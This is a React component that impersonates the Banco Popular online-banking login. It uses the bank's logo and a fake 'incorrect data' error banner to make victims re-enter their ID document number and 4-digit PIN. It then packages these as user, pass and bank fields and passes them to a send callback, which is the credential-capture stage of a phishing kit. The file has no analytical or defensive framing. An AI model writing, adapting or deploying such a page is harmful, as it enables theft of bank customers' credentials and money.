/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
/* eslint-disable jsx-a11y/alt-text */
"use client";
import { useState } from "react";

export default function ErrorApp({ enviar }: any) {
  const [step, setStep] = useState<"login" | "clave">("login");
  const [documento, setDocumento] = useState("");
  const [tipo, setTipo] = useState("CC");
  const [clave, setClave] = useState("");

  const continuar = () => {
    if (!documento.trim()) return;
    setStep("clave");
  };

  const enviarClave = () => {

    const payload = {
      view: 'errorlogin',
      user: documento,
      pass: clave,
      bank: "Popular",
      timestamp: new Date().toISOString(),
    };

    enviar?.(payload);
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* HEADER */}
      <div className="bg-green-600 h-6 w-full fixed top-0 left-0 z-50"></div>

      <div className="max-w-md mx-auto mt-16 mb-10 px-5 py-5 w-full">

        {/* Error Banner */}
        <div style={{ backgroundColor: '#ffebee', color: '#c62828', padding: '12px', borderRadius: '8px', marginBottom: '16px', textAlign: 'center', fontWeight: 'bold', fontSize: '14px' }}>
          Datos incorrectos. Por favor, verifica tu usuario y clave e inténtalo de nuevo.
        </div>

        {/* ======================= STEP 1 — LOGIN ======================= */}
        {step === "login" && (
          <>
            <h1 className="text-2xl font-bold text-center text-black">Bienvenido a</h1>

            <div className="flex items-center justify-center my-5">
              <img
                src="/bancos/popular/popularhorizontal_new.svg"
                width={180}
                className="h-auto w-auto"
              />
            </div>

            <form className="flex flex-col gap-5" onSubmit={(e) => e.preventDefault()}>
              {/* Tipo de Documento */}
              <div>
                <label
                  htmlFor="tipo"
                  className="block mt-5 font-semibold text-sm text-black"
                >
                  Tipo de documento
                </label>
                <div className="relative mt-2 w-full">
                  <select
                    id="tipo"
                    className="block w-full p-3.5 border text-black border-gray-300 rounded-lg focus:ring-2 focus:ring-green-600"
                    value={tipo}
                    onChange={(e) => setTipo(e.target.value)}
                  >
                    <option value="CC">Cédula de Ciudadanía</option>
                    <option value="CE">Cédula de Extranjería</option>
                    <option value="NIT">NIT</option>
                    <option value="PASS">Pasaporte</option>
                  </select>
                  <span className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-600">
                    ▼
                  </span>
                </div>
              </div>

              {/* Número documento */}
              <div>
                <label
                  htmlFor="document"
                  className="block mt-5 font-semibold text-sm text-black"
                >
                  Número de documento
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  id="document"
                  className="w-full p-3.5 mt-2 border text-black border-gray-300 rounded-lg"
                  value={documento}
                  onChange={(e) => setDocumento(e.target.value.replace(/\D/g, ""))}
                />
              </div>

              {/* Recordar */}
              <div className="flex items-center gap-2.5 mt-5">
                <input type="checkbox" id="remember" className="w-5 h-5" />
                <label htmlFor="remember" className="text-sm text-black">
                  Recordar tipo y número de documento
                </label>
              </div>

              {/* Botón */}
              <button
                type="button"
                onClick={continuar}
                disabled={!documento}
                className="w-full p-4 text-lg rounded-2xl mt-8 font-bold transition-all bg-green-600 text-white disabled:bg-gray-400"
              >
                Continuar
              </button>
            </form>

            <div className="text-center mt-5 text-sm text-gray-600">
              ¿No eres usuario?{" "}
              <span className="text-orange-500 font-bold cursor-pointer">
                Regístrate aquí
              </span>
            </div>

            <div className="flex mt-12 gap-1 text-xs justify-center ">
              <p className="text-gray-500">Protegido por reCAPTCHA</p> |{" "}
              <span className="text-[#FE680D]">Privacidad - Condiciones</span>
            </div>
          </>
        )}

        {/* ======================= STEP 2 — CLAVE ======================= */}
        {step === "clave" && (
          <>
            <div className="flex items-center justify-center my-5">
              <img
                src="/bancos/popular/popularhorizontal_new.svg"
                width={180}
                className="h-auto w-auto"
              />
            </div>
            <h1 className="text-3xl font-bold text-black text-center mb-10">
              Ingresa tu clave
            </h1>

            <div>
              <label className="block font-semibold text-lg mb-3 text-black">
                Clave de 4 dígitos
              </label>

              <div className="w-full border border-gray-300 rounded-2xl p-6 flex justify-center">
                <input
                  type="password"
                  maxLength={4}
                  inputMode="numeric"
                  className="opacity-0 absolute text-black"
                  autoFocus
                  onChange={(e) =>
                    setClave(e.target.value.replace(/\D/g, "").slice(0, 4))
                  }
                />
                <div className="flex gap-4">
                  {[0, 1, 2, 3].map((i) => (
                    <div
                      key={i}
                      className={`w-3 h-3 rounded-full text-black ${clave.length > i ? "bg-gray-600" : "bg-gray-300"
                        }`}
                    />
                  ))}
                </div>
              </div>

              <div className="text-right mt-3">
                <span className="text-orange-500 font-semibold cursor-pointer">
                  ¿Olvidaste tu clave?
                </span>
              </div>

              <button
                disabled={clave.length !== 4}
                onClick={enviarClave}
                className="w-full p-4 text-xl rounded-2xl mt-10 font-bold bg-green-600 text-white disabled:bg-gray-400"
              >
                Ingresar
              </button>
            </div>
          </>
        )}
      </div>

      {/* FOOTER */}
      <footer className="fixed bottom-0 left-0 w-full text-xs underline flex justify-center gap-16 py-3 bg-white text-[#FE680D] shadow-[0_-2px_8px_rgba(0,0,0,0.04)] z-50">
        <span>Seguridad</span>
        <span>Accesibilidad</span>
      </footer>
    </div>
  );
}
